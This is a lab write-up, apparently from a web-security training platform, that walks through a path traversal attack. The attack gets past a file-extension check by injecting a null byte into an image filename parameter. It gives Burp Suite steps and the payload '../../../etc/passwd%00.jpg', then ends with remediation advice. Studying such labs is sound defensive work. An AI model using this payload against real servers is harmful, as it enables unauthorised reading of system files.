## 🧪 Lab: File Path Traversal - Validation of File Extension with Null Byte Bypass  
**Level**: Practitioner  
**Date**: June 16, 2025  
**Goal**: Read `/etc/passwd` even when the application validates file extensions (e.g., `.jpg`).

---

### 🧰 Tools  
- Burp Suite (Repeater / Interceptor)  
- URL Encoder

---

### 🧭 Steps

1. **Intercept the image request**  
   - Navigate to the product page and capture a request like:
     ```
     GET /image?filename=218.jpg
     ```

2. **Send to Repeater**

3. **Test direct traversal without extension**  
   - Try:
     ```
     filename=../../../etc/passwd
     ```
   - ❌ Request fails or blocked — `.jpg` extension required

4. **Try traversal with fake extension**  
   - Try:
     ```
     filename=../../../etc/passwd.jpg
     ```
   - ❌ Fails — no such file

5. **Bypass with Null Byte Injection**  
   - Inject a null byte before `.jpg`:
     ```
     filename=../../../etc/passwd%00.jpg
     ```
   - ✅ Server processes path before null byte and retrieves `/etc/passwd`

---

### 💣 Payload

```
../../../etc/passwd%00.jpg

```


---

### 💡 Observations
- Some applications validate extensions by checking string suffixes
- Null byte (`%00`) injection can terminate string early at the backend
- This tricks the system into processing the path before `.jpg` is even considered

---

### 🔒 Remediation
- Do not rely on string matching for extension validation  
- Use secure file APIs and path sanitization  
- Disable null byte interpretation at server level  
- Avoid exposing any user-controlled file paths
